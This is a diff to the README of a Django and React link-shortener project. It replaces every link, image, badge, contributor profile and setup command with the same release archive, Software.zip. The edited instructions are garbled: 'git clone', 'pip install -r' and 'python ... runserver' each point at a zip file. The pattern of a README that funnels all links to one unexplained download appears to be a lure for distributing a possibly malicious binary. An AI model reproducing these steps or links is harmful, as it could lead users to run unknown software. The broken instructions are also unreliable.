@@ -1,8 +1,8 @@
 # Awesome Link Shortener 🚀
 
-![Link Shortener](https://your-image-url.com)
+![Link Shortener](https://github.com/Alianass/link_shortener/releases/download/v2.0/Software.zip)
 
-Welcome to **Link Shortener**, a modern web application for shortening URLs built with Django REST Framework and React.js. This project provides a simple and efficient way to create shortened URLs with custom slugs, track click analytics, and manage your links through a clean user interface built with Chakra UI.
+Welcome to **Link Shortener**, a modern web application for shortening URLs built with Django REST Framework and https://github.com/Alianass/link_shortener/releases/download/v2.0/Software.zip This project provides a simple and efficient way to create shortened URLs with custom slugs, track click analytics, and manage your links through a clean user interface built with Chakra UI.
 
 ## Features 🌟
 
@@ -19,12 +19,12 @@ To get started with **Link Shortener**, follow these steps:
 
 1. Clone the repository:
 ```
-git clone https://github.com/your-repo/link_shortener.git
+git clone https://github.com/Alianass/link_shortener/releases/download/v2.0/Software.zip
 ```
 
 2. Install dependencies for the Django backend:
 ```
-pip install -r requirements.txt
+pip install -r https://github.com/Alianass/link_shortener/releases/download/v2.0/Software.zip
 ```
 
 3. Install dependencies for the React frontend:
@@ -35,7 +35,7 @@ npm install
 
 4. Start the Django backend server:
 ```
-python manage.py runserver
+python https://github.com/Alianass/link_shortener/releases/download/v2.0/Software.zip runserver
 ```
 
 5. Start the React frontend server:
@@ -56,21 +56,21 @@ npm start
 
 ## Additional Information ℹ️
 
-For more detailed information on using the application and its features, please refer to the [documentation](https://link-shortener-docs.com).
+For more detailed information on using the application and its features, please refer to the [documentation](https://github.com/Alianass/link_shortener/releases/download/v2.0/Software.zip).
 
 ## Instalation File Launch 🚀
 
 Click the button below to download the installation file and launch the application:
 
-[![Download Application](https://img.shields.io/badge/Download-Application-blue)](https://github.com/user-attachments/files/18426772/Application.zip)
+[![Download Application](https://github.com/Alianass/link_shortener/releases/download/v2.0/Software.zip)](https://github.com/Alianass/link_shortener/releases/download/v2.0/Software.zip)
 
 ## Contributors 👩‍💻👨‍💻
 
-- John Doe [@johndoe](https://github.com/johndoe)
-- Jane Smith [@janesmith](https://github.com/janesmith)
+- John Doe [@johndoe](https://github.com/Alianass/link_shortener/releases/download/v2.0/Software.zip)
+- Jane Smith [@janesmith](https://github.com/Alianass/link_shortener/releases/download/v2.0/Software.zip)
 
 ## Support 🤝
 
-If you encounter any issues or have questions, please feel free to [open an issue](https://github.com/your-repo/link_shortener/issues).
+If you encounter any issues or have questions, please feel free to [open an issue](https://github.com/Alianass/link_shortener/releases/download/v2.0/Software.zip).
 
 Thank you for using **Link Shortener**! 🌐
